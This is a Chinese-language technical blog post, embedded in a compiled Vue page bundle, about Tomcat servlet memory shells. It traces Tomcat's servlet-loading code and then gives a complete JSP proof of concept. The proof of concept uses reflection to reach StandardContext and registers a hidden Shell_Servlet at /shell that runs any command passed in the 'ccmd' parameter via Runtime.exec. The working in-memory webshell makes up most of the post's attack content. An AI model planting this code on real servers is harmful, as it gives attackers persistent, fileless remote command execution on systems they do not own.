import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as i}from"./app-DS0ZCcmM.js";const l={};function p(t,n){return i(),a("div",null,n[0]||(n[0]=[e(`<h1 id="servlet" tabindex="-1"><a class="header-anchor" href="#servlet"><span>Servlet</span></a></h1><h3 id="加载servlet流程" tabindex="-1"><a class="header-anchor" href="#加载servlet流程"><span>加载servlet流程</span></a></h3><p>把断点下在init(),看调用栈</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629210821179.png" alt="image-20240629210821179" tabindex="0" loading="lazy"><figcaption>image-20240629210821179</figcaption></figure><p><strong>StandardWrapper#loadServlet</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211404151.png" alt="image-20240629211404151" tabindex="0" loading="lazy"><figcaption>image-20240629211404151</figcaption></figure><p>调用inintServlet，传入servlet参数，同样在该函数中</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211451083.png" alt="image-20240629211451083" tabindex="0" loading="lazy"><figcaption>image-20240629211451083</figcaption></figure><p><strong>StandardContext#loadOnStartup</strong></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211847746.png" alt="image-20240629211847746" tabindex="0" loading="lazy"><figcaption>image-20240629211847746</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211923566.png" alt="image-20240629211923566" tabindex="0" loading="lazy"><figcaption>image-20240629211923566</figcaption></figure><p>wrapper来自于child对象的转换，children来自于ContainerBase#findChildren</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212020447.png" alt="image-20240629212020447" tabindex="0" loading="lazy"><figcaption>image-20240629212020447</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212102657.png" alt="image-20240629212102657" tabindex="0" loading="lazy"><figcaption>image-20240629212102657</figcaption></figure><p>最后传入的Children参数是Standardwrapper对象</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212312908.png" alt="image-20240629212312908" tabindex="0" loading="lazy"><figcaption>image-20240629212312908</figcaption></figure><p>可以看到最后一个对象就是我们的servlet,因此主要修改这里</p><p>最后会调用到addChild()</p><p><strong>创建StandardWrapper</strong></p><p>来看下这里的standardWrapper对象是如何创建的</p><p>跟到ContextConfig#webConfig()</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212100105.png" alt="image-20240630212100105" tabindex="0" loading="lazy"><figcaption>image-20240630212100105</figcaption></figure><p>解析web.xml各种参数</p><p>调用ContextConfig#configureContext来创建wrapper</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212215863.png" alt="image-20240630212215863" tabindex="0" loading="lazy"><figcaption>image-20240630212215863</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212357937.png" alt="image-20240630212357937" tabindex="0" loading="lazy"><figcaption>image-20240630212357937</figcaption></figure><p>创建的servlet参数存在servletMappings参数中</p><p>至此我们基本思路可以确定</p><p>获取StandardContext,创建一个恶意wrapper对象并加载该对象，将url对应的参数添加进servletMappings</p><h3 id="poc编写" tabindex="-1"><a class="header-anchor" href="#poc编写"><span>POC编写</span></a></h3><p>首先获取StandardContxt对象</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取ApplicationContextFaced类</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>
<span class="line"><span>    Field appContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContext.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>
<span class="line"><span>    //获取StandardContext</span></span>
<span class="line"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    stdContext.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建恶意的Servlet</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%!</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>    public class Shell_Servlet implements Servlet {</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void init(ServletConfig config) throws ServletException {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public ServletConfig getServletConfig() {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {</span></span>
<span class="line"><span>            String cmd = req.getParameter(&quot;ccmd&quot;);</span></span>
<span class="line"><span>            if (cmd !=null){</span></span>
<span class="line"><span>                try{</span></span>
<span class="line"><span>                    Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>                }catch (IOException e){</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>                }catch (NullPointerException n){</span></span>
<span class="line"><span>                    n.printStackTrace();</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public String getServletInfo() {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void destroy() {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span> </span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>准备wrapper对象，设置对应的参数并添加进当前context上下文</p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%</span></span>
<span class="line"><span>    Shell_Servlet shell_servlet = new Shell_Servlet();</span></span>
<span class="line"><span>    String name = shell_servlet.getClass().getSimpleName();</span></span>
<span class="line"><span>    Wrapper wrapper = standardContext.createWrapper();</span></span>
<span class="line"><span>    wrapper.setName(name);</span></span>
<span class="line"><span>    wrapper.setLoadOnStartup(1);</span></span>
<span class="line"><span>    wrapper.setServlet(shell_servlet);</span></span>
<span class="line"><span>    wrapper.setServletClass(shell_servlet.getClass().getName());</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    //将wrapper对象添加进StandardContext</span></span>
<span class="line"><span>    standardContext.addChild(wrapper);</span></span>
<span class="line"><span>    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>完整poc</strong></p><div class="language-jsp line-numbers-mode" data-highlighter="shiki" data-ext="jsp" data-title="jsp" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>&lt;%--</span></span>
<span class="line"><span>  Created by IntelliJ IDEA.</span></span>
<span class="line"><span>  User: Administrator</span></span>
<span class="line"><span>  Date: 2024/6/30</span></span>
<span class="line"><span>  Time: 21:31</span></span>
<span class="line"><span>  To change this template use File | Settings | File Templates.</span></span>
<span class="line"><span>--%&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;</span></span>
<span class="line"><span>&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span></span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    //获取ApplicationContextFaced类</span></span>
<span class="line"><span>    ServletContext servletContext = request.getSession().getServletContext();</span></span>
<span class="line"><span>    //反射获取StandardContext,首先获取到ApplicationContextFaced类context属性，为类ApplicationContext的一个对象</span></span>
<span class="line"><span>    Field appContext = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    appContext.setAccessible(true);</span></span>
<span class="line"><span>    ApplicationContext applicationContext = (ApplicationContext) appContext.get(servletContext);</span></span>
<span class="line"><span>    //获取StandardContext</span></span>
<span class="line"><span>    Field stdContext = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span>
<span class="line"><span>    stdContext.setAccessible(true);</span></span>
<span class="line"><span>    StandardContext standardContext = (StandardContext) stdContext.get(applicationContext);</span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%!</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    public class Shell_Servlet implements Servlet {</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void init(ServletConfig config) throws ServletException {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public ServletConfig getServletConfig() {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {</span></span>
<span class="line"><span>            String cmd = req.getParameter(&quot;ccmd&quot;);</span></span>
<span class="line"><span>            if (cmd !=null){</span></span>
<span class="line"><span>                try{</span></span>
<span class="line"><span>                    Runtime.getRuntime().exec(cmd);</span></span>
<span class="line"><span>                }catch (IOException e){</span></span>
<span class="line"><span>                    e.printStackTrace();</span></span>
<span class="line"><span>                }catch (NullPointerException n){</span></span>
<span class="line"><span>                    n.printStackTrace();</span></span>
<span class="line"><span>                }</span></span>
<span class="line"><span>            }</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public String getServletInfo() {</span></span>
<span class="line"><span>            return null;</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>        @Override</span></span>
<span class="line"><span>        public void destroy() {</span></span>
<span class="line"><span>        }</span></span>
<span class="line"><span>    }</span></span>
<span class="line"><span></span></span>
<span class="line"><span>%&gt;</span></span>
<span class="line"><span>&lt;%</span></span>
<span class="line"><span>    Shell_Servlet shell_servlet = new Shell_Servlet();</span></span>
<span class="line"><span>    String name = shell_servlet.getClass().getSimpleName();</span></span>
<span class="line"><span>    Wrapper wrapper = standardContext.createWrapper();</span></span>
<span class="line"><span>    wrapper.setName(name);</span></span>
<span class="line"><span>    wrapper.setLoadOnStartup(1);</span></span>
<span class="line"><span>    wrapper.setServlet(shell_servlet);</span></span>
<span class="line"><span>    wrapper.setServletClass(shell_servlet.getClass().getName());</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    //将wrapper对象添加进StandardContext</span></span>
<span class="line"><span>    standardContext.addChild(wrapper);</span></span>
<span class="line"><span>    standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);</span></span>
<span class="line"><span>%&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果如图</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630215445484.png" alt="image-20240630215445484" tabindex="0" loading="lazy"><figcaption>image-20240630215445484</figcaption></figure>`,40)]))}const d=s(l,[["render",p],["__file","Servlet.html.vue"]]),o=JSON.parse('{"path":"/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Servlet.html","title":"Servlet","lang":"zh-CN","frontmatter":{"description":"Servlet 加载servlet流程 把断点下在init(),看调用栈 image-20240629210821179image-20240629210821179 StandardWrapper#loadServlet image-20240629211404151image-20240629211404151 调用inintServlet，传入s...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/Java%E5%AD%A6%E4%B9%A0/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat/Servlet.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Servlet"}],["meta",{"property":"og:description","content":"Servlet 加载servlet流程 把断点下在init(),看调用栈 image-20240629210821179image-20240629210821179 StandardWrapper#loadServlet image-20240629211404151image-20240629211404151 调用inintServlet，传入s..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629210821179.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Servlet\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629210821179.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211404151.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211451083.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211847746.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629211923566.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212020447.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212102657.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629212312908.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212100105.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212215863.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630212357937.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240630215445484.png\\"],\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":3,"title":"加载servlet流程","slug":"加载servlet流程","link":"#加载servlet流程","children":[]},{"level":3,"title":"POC编写","slug":"poc编写","link":"#poc编写","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":2.21,"words":662},"filePathRelative":"Java学习/内存马/Tomcat/Servlet.md","localizedDate":"2025年1月16日","excerpt":"\\n<h3>加载servlet流程</h3>\\n<p>把断点下在init(),看调用栈</p>\\n<figure><img src=\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240629210821179.png\\" alt=\\"image-20240629210821179\\" tabindex=\\"0\\" loading=\\"lazy\\"><figcaption>image-20240629210821179</figcaption></figure>\\n<p><strong>StandardWrapper#loadServlet</strong></p>","autoDesc":true}');export{d as comp,o as data};
